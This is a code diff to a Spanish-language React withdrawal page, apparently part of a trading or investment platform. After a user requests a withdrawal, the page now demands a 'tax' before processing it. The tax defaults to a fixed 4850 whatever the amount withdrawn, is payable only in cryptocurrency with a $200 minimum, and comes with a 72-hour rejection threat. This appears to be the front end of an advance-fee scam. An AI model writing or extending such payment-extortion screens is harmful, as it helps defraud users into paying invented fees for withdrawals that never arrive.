@@ -10,9 +10,10 @@ import { Label } from '../components/ui/label';
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '../components/ui/select';
 import { 
     Upload, Loader2, Clock, AlertCircle, CheckCircle, Building2, 
-    CreditCard, Globe, User, AlertTriangle, Shield, BadgeCheck, Hourglass
+    CreditCard, Globe, User, AlertTriangle, Shield, BadgeCheck, Hourglass, Bitcoin, DollarSign
 } from 'lucide-react';
 import { toast } from 'sonner';
+import { CryptoPaymentSection } from '../components/crypto/CryptoPaymentSection';
 
 // Spanish banks with their BIC codes
 const SPANISH_BANKS = [
@@ -157,6 +158,10 @@ export const WithdrawPage = () => {
     const [kycVerified, setKycVerified] = useState(false);
     const [kycPending, setKycPending] = useState(false);
     
+    // Tax payment state
+    const [createdTransaction, setCreatedTransaction] = useState(null);
+    const [showTaxPayment, setShowTaxPayment] = useState(false);
+    
     // Banking info
     const [accountHolder, setAccountHolder] = useState('');
     const [iban, setIban] = useState('');
@@ -291,7 +296,7 @@ export const WithdrawPage = () => {
                 detected_country: detectedCountry
             };
             
-            await transactionsAPI.create({
+            const response = await transactionsAPI.create({
                 account_id: selectedAccount,
                 transaction_type: 'withdraw',
                 amount: numAmount,
@@ -300,20 +305,11 @@ export const WithdrawPage = () => {
                 banking_info: bankingInfo
             });
             
-            setSuccess(true);
-            toast.success('Solicitud de retiro enviada. Pendiente de aprobación.');
+            // Save the created transaction and show tax payment screen
+            setCreatedTransaction(response.data);
+            setShowTaxPayment(true);
+            toast.success('Solicitud de retiro creada. Debe pagar el impuesto para continuar.');
             
-            // Reset form
-            setAmount('');
-            setAccountHolder('');
-            setIban('');
-            setSelectedBank('');
-            setCustomBankName('');
-            setCustomBankCountry('');
-            setCustomBankCity('');
-            setManualBank(false);
-            
-            setTimeout(() => setSuccess(false), 3000);
         } catch (error) {
             toast.error(error.response?.data?.detail || 'Error al procesar el retiro');
         } finally {
@@ -476,6 +472,210 @@ export const WithdrawPage = () => {
                                 </div>
                             </CardContent>
                         </Card>
+                    </motion.div>
+                </div>
+            </Layout>
+        );
+    }
+
+    // Show tax payment screen after withdrawal request
+    if (showTaxPayment && createdTransaction) {
+        const taxRequired = createdTransaction.tax_required || 4850;
+        const taxPaid = createdTransaction.tax_paid || 0;
+        const taxRemaining = Math.max(0, taxRequired - taxPaid);
+        
+        return (
+            <Layout>
+                <div className="max-w-3xl mx-auto space-y-8" data-testid="withdraw-tax-payment">
+                    <motion.div
+                        initial={{ opacity: 0, y: -10 }}
+                        animate={{ opacity: 1, y: 0 }}
+                    >
+                        <h1 className="text-3xl text-white" style={{ fontWeight: 700, letterSpacing: '-0.02em' }}>
+                            Solicitud de Retiro Creada
+                        </h1>
+                        <p className="text-slate-500 mt-1 font-light">Pendiente de aprobación - Pago de impuesto requerido</p>
+                    </motion.div>
+
+                    {/* Status Badge */}
+                    <motion.div
+                        initial={{ opacity: 0, y: 10 }}
+                        animate={{ opacity: 1, y: 0 }}
+                        transition={{ delay: 0.1 }}
+                        className="flex items-center gap-3 p-3 rounded-lg bg-amber-500/10 border border-amber-500/30"
+                    >
+                        <AlertTriangle className="w-5 h-5 text-amber-400" />
+                        <span className="text-amber-400 text-sm" style={{ fontWeight: 500 }}>
+                            Pendiente de Aprobación - Favor pagar impuesto para procesar su retiro
+                        </span>
+                    </motion.div>
+
+                    {/* Withdrawal Summary */}
+                    <motion.div
+                        initial={{ opacity: 0, y: 20 }}
+                        animate={{ opacity: 1, y: 0 }}
+                        transition={{ delay: 0.2 }}
+                    >
+                        <Card className="bg-slate-900/70 backdrop-blur-xl border-slate-800">
+                            <CardHeader>
+                                <CardTitle className="text-white flex items-center gap-2" style={{ fontWeight: 700 }}>
+                                    <DollarSign className="w-5 h-5 text-emerald-400" />
+                                    Resumen de su Solicitud
+                                </CardTitle>
+                            </CardHeader>
+                            <CardContent className="space-y-4">
+                                <div className="grid grid-cols-2 gap-4">
+                                    <div className="p-4 rounded-lg bg-slate-800/50">
+                                        <p className="text-slate-400 text-sm">Monto del Retiro</p>
+                                        <p className="text-2xl text-white" style={{ fontWeight: 700, fontVariantNumeric: 'tabular-nums' }}>
+                                            {createdTransaction.currency === 'USD' ? '$' : '€'}{createdTransaction.amount?.toFixed(2)}
+                                        </p>
+                                    </div>
+                                    <div className="p-4 rounded-lg bg-slate-800/50">
+                                        <p className="text-slate-400 text-sm">Referencia</p>
+                                        <p className="text-lg text-white font-mono">
+                                            {createdTransaction.transaction_reference || createdTransaction.id?.slice(0, 12)}
+                                        </p>
+                                    </div>
+                                </div>
+                                
+                                {/* Banking Info */}
+                                {createdTransaction.banking_info && (
+                                    <div className="p-4 rounded-lg bg-slate-800/50 space-y-2">
+                                        <p className="text-slate-400 text-sm flex items-center gap-2">
+                                            <Building2 className="w-4 h-4" />
+                                            Datos Bancarios
+                                        </p>
+                                        <div className="grid grid-cols-2 gap-2 text-sm">
+                                            <span className="text-slate-500">Titular:</span>
+                                            <span className="text-white">{createdTransaction.banking_info.account_holder}</span>
+                                            <span className="text-slate-500">Banco:</span>
+                                            <span className="text-white">{createdTransaction.banking_info.bank_name}</span>
+                                            <span className="text-slate-500">IBAN:</span>
+                                            <span className="text-white font-mono text-xs">{createdTransaction.banking_info.iban}</span>
+                                        </div>
+                                    </div>
+                                )}
+                            </CardContent>
+                        </Card>
+                    </motion.div>
+
+                    {/* Tax Payment Required */}
+                    <motion.div
+                        initial={{ opacity: 0, y: 20 }}
+                        animate={{ opacity: 1, y: 0 }}
+                        transition={{ delay: 0.3 }}
+                    >
+                        <Card className="bg-gradient-to-br from-orange-500/10 to-amber-500/10 border-orange-500/30">
+                            <CardHeader>
+                                <CardTitle className="text-orange-400 flex items-center gap-2" style={{ fontWeight: 700 }}>
+                                    <AlertTriangle className="w-5 h-5" />
+                                    Pago de Impuesto Requerido
+                                </CardTitle>
+                                <CardDescription className="text-orange-400/70">
+                                    Para procesar su solicitud de retiro, debe abonar el impuesto correspondiente
+                                </CardDescription>
+                            </CardHeader>
+                            <CardContent className="space-y-4">
+                                <div className="grid grid-cols-3 gap-4">
+                                    <div className="p-4 rounded-lg bg-slate-900/50 text-center">
+                                        <p className="text-slate-400 text-xs">Impuesto Requerido</p>
+                                        <p className="text-2xl text-orange-400" style={{ fontWeight: 700, fontVariantNumeric: 'tabular-nums' }}>
+                                            ${taxRequired.toFixed(2)}
+                                        </p>
+                                    </div>
+                                    <div className="p-4 rounded-lg bg-slate-900/50 text-center">
+                                        <p className="text-slate-400 text-xs">Pagado</p>
+                                        <p className="text-2xl text-emerald-400" style={{ fontWeight: 700, fontVariantNumeric: 'tabular-nums' }}>
+                                            ${taxPaid.toFixed(2)}
+                                        </p>
+                                    </div>
+                                    <div className="p-4 rounded-lg bg-slate-900/50 text-center">
+                                        <p className="text-slate-400 text-xs">Restante</p>
+                                        <p className="text-2xl text-red-400" style={{ fontWeight: 700, fontVariantNumeric: 'tabular-nums' }}>
+                                            ${taxRemaining.toFixed(2)}
+                                        </p>
+                                    </div>
+                                </div>
+
+                                <div className="p-3 rounded-lg bg-cyan-500/10 border border-cyan-500/30">
+                                    <p className="text-cyan-400 text-sm">
+                                        <Clock className="w-4 h-4 inline mr-2" />
+                                        Abono mínimo: <strong>$200 USD</strong>. Puede realizar abonos parciales hasta completar el total.
+                                    </p>
+                                </div>
+
+                                <div className="p-3 rounded-lg bg-red-500/10 border border-red-500/30">
+                                    <p className="text-red-400 text-sm">
+                                        <AlertTriangle className="w-4 h-4 inline mr-2" />
+                                        <strong>Importante:</strong> Si el impuesto no se paga dentro de 72 horas, el retiro será rechazado automáticamente.
+                                    </p>
+                                </div>
+                            </CardContent>
+                        </Card>
+                    </motion.div>
+
+                    {/* Crypto Payment Section */}
+                    <motion.div
+                        initial={{ opacity: 0, y: 20 }}
+                        animate={{ opacity: 1, y: 0 }}
+                        transition={{ delay: 0.4 }}
+                    >
+                        <Card className="bg-slate-900/70 backdrop-blur-xl border-slate-800">
+                            <CardHeader>
+                                <CardTitle className="text-white flex items-center gap-2" style={{ fontWeight: 700 }}>
+                                    <Bitcoin className="w-5 h-5 text-orange-400" />
+                                    Pagar con Criptomonedas
+                                </CardTitle>
+                                <CardDescription className="text-slate-500">
+                                    Seleccione una criptomoneda y envíe el monto correspondiente
+                                </CardDescription>
+                            </CardHeader>
+                            <CardContent>
+                                <CryptoPaymentSection 
+                                    transaction={createdTransaction}
+                                    onPaymentSubmitted={() => {
+                                        toast.success('Pago enviado para revisión. Recibirá una notificación cuando sea aprobado.');
+                                        navigate('/transactions');
+                                    }}
+                                />
+                            </CardContent>
+                        </Card>
+                    </motion.div>
+
+                    {/* Action Buttons */}
+                    <motion.div
+                        initial={{ opacity: 0, y: 20 }}
+                        animate={{ opacity: 1, y: 0 }}
+                        transition={{ delay: 0.5 }}
+                        className="flex gap-4"
+                    >
+                        <Button
+                            onClick={() => navigate('/transactions')}
+                            variant="outline"
+                            className="flex-1 border-slate-700 text-slate-300 hover:bg-slate-800"
+                        >
+                            Ver Mis Transacciones
+                        </Button>
+                        <Button
+                            onClick={() => {
+                                setShowTaxPayment(false);
+                                setCreatedTransaction(null);
+                                // Reset form
+                                setAmount('');
+                                setAccountHolder('');
+                                setIban('');
+                                setSelectedBank('');
+                                setCustomBankName('');
+                                setCustomBankCountry('');
+                                setCustomBankCity('');
+                                setManualBank(false);
+                            }}
+                            variant="outline"
+                            className="flex-1 border-emerald-500/50 text-emerald-400 hover:bg-emerald-500/10"
+                        >
+                            Crear Otro Retiro
+                        </Button>
                     </motion.div>
                 </div>
             </Layout>
